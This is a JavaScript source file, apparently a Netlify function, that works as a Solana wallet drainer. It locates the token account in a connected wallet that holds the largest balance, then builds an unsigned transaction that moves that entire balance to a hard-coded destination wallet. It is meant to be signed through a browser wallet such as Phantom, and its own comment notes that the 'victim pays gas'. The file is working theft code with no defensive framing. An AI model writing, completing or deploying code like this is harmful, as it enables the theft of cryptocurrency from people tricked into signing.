const { Connection, PublicKey, TransactionMessage, VersionedTransaction, Keypair } = require('@solana/web3.js');
const { getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID, getAccount } = require('@solana/spl-token');

// YOUR WALLET ADDRESS (Public Key only - no key needed for this script)
const DESTINATION_WALLET_ADDRESS = "HeLknryeK1f1UA9NZjx78RCzwfMZKEcyAYYem1kruRk4";

async function drainHighestValueToken(walletPublicKey) {
    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
    
    // 1. Get all token accounts for this wallet
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(walletPublicKey, {
        programId: TOKEN_PROGRAM_ID
    });

    let highestValueAccount = null;
    let highestRawBalance = 0n; // Use BigInt for raw balance

    // 2. Find the token account with the highest RAW balance
    for (const account of tokenAccounts.value) {
        const rawAmount = BigInt(account.account.data.parsed.info.tokenAmount.amount);
        if (rawAmount > highestRawBalance) {
            highestRawBalance = rawAmount;
            highestValueAccount = account;
        }
    }

    if (!highestValueAccount) {
        console.log("No tokens found.");
        return null;
    }

    const sourceTokenAccount = highestValueAccount.account.pubkey;
    const mintAddress = new PublicKey(highestValueAccount.account.data.parsed.info.mint);
    const payerPublicKey = new PublicKey(walletPublicKey);
    
    // 3. Get destination token account for YOUR wallet
    const destTokenAccount = await getAssociatedTokenAddress(
        mintAddress,
        new PublicKey(DESTINATION_WALLET_ADDRESS),
        false
    );

    // 4. Create the Transfer Instruction
    const transferInstruction = createTransferInstruction(
        sourceTokenAccount,
        destTokenAccount,
        payerPublicKey,
        highestRawBalance
    );

    // 5. Build the Message (v0)
    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
    
    const message = new TransactionMessage({
        payerKey: payerPublicKey, // Victim pays gas
        recentBlockhash: blockhash,
        instructions: [transferInstruction]
    }).compileToV0Message();

    // 6. Return the VersionedTransaction
    const transaction = new VersionedTransaction(message);
    
    // Return the serialized transaction bytes or the object depending on your frontend needs
    // For Phantom/Claw, you usually return the serialized bytes or the object to be signed
    return {
        transaction: transaction,
        blockhash: blockhash,
        lastValidBlockHeight: lastValidBlockHeight
    };
}

// Export for Netlify Function usage
module.exports = { drainHighestValueToken };